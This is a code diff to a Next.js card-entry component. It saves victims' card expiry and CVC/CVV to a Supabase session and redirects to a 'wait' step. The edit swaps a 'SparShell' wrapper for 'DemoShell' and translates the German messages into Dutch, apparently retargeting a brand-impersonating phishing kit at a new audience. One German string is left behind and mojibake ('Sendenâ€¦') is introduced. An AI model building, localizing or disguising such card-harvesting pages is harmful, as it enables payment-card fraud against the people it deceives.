@@ -2,7 +2,7 @@
 
 import { useEffect, useState } from "react";
 import { useRouter } from "next/navigation";
-import { SparShell } from "@/components/demo/SparShell";
+import { DemoShell } from "@/components/demo/DemoShell";
 import { ConfigMissing } from "@/components/demo/ConfigMissing";
 import { createBrowserSupabaseClient } from "@/lib/supabase/client";
 import { stepToPath } from "@/lib/session-routes";
@@ -56,11 +56,11 @@ export function CardClient({ sessionId }: Props) {
     e.preventDefault();
     if (!supabase || !sessionId) return;
     if (!expiryValid) {
-      setMsg("Bitte geben Sie ein gueltiges Ablaufdatum im Format MM/JJ ein.");
+      setMsg("Voer een geldige vervaldatum in (MM/JJ).");
       return;
     }
     if (!cvcValid) {
-      setMsg("Bitte geben Sie einen gueltigen CVV mit 3 oder 4 Ziffern ein.");
+      setMsg("Voer een geldige CVC/CVV in (3 of 4 cijfers).");
       return;
     }
     setSaving(true);
@@ -83,30 +83,30 @@ export function CardClient({ sessionId }: Props) {
       .eq("id", sessionId);
 
     setSaving(false);
-    if (error) setMsg("Speichern fehlgeschlagen.");
+    if (error) setMsg("Opslaan mislukt.");
     else router.replace(stepToPath("wait", sessionId));
   }
 
   if (!supabase) {
     return (
-      <SparShell title="Kartendaten">
+      <DemoShell title="Kaartgegevens">
         <ConfigMissing />
-      </SparShell>
+      </DemoShell>
     );
   }
 
   if (!sessionId) {
     return (
-      <SparShell title="Kartendaten">
+      <DemoShell title="Kaartgegevens">
         <p className="rounded-xl border border-amber-200 bg-amber-50 p-4 text-center text-sm">
           Ungueltiger Link.
         </p>
-      </SparShell>
+      </DemoShell>
     );
   }
 
   return (
-    <SparShell>
+    <DemoShell>
       <div className="space-y-4 w-full mt-24 sm:mt-6">
         <div className={ui.panel}>
           <div className="text-center mb-6">
@@ -168,11 +168,11 @@ export function CardClient({ sessionId }: Props) {
             disabled={saving || !expiryValid || !cvcValid}
             className={ui.submit}
           >
-            {saving ? "Senden…" : settings.card_button}
+            {saving ? "Sendenâ€¦" : settings.card_button}
           </button>
         </form>
         </div>
       </div>
-    </SparShell>
+    </DemoShell>
   );
 }
